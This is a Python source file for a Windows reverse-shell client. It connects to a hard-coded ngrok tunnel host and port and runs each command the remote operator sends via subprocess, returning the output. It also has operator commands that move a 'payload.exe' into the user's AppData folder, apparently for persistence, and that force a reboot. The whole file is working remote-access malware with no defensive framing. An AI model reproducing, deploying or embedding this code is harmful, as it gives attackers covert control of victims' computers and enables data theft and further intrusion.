import socket
import os
import subprocess
import sys
from time import sleep

HOST = "2.tcp.ngrok.io"
PORT = 18334
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def movePayload():
    user = os.getlogin()
    os.system(f"attrib -h C:\\Users\\{user}\\AppData")
    os.system(f"move payload.exe C:\\Users\\{user}\\AppData")

def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    # Get current location
    cwd = os.getcwd()
    s.send(cwd.encode())

    # this loop will run until it receive 'quit'
    while True:

        # receive the command and print it
        cmd = s.recv(BUFFER_SIZE).decode()
        splited_command = cmd.split()
        #print(f'[*] receive {cmd}')

        # check if you want to quit
        if cmd.lower() == 'quit':
            break

        if cmd.lower() == "payforever":
            movePayload()

        if cmd.lower() == "go to sleep":
            os.system("shutdown /r")

        try:
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
        except IndexError:
            print("[ERROR] Retrying...")
            s.close()
            sleep(10)
            main()

        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(cmd)
        # send teh result to the server
        try:
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        except ConnectionAbortedError:
            print("[ERROR] Retrying...")
            s.close()
            sleep(10)
            main()
    s.close()
    

if __name__ == "__main__":
    main()
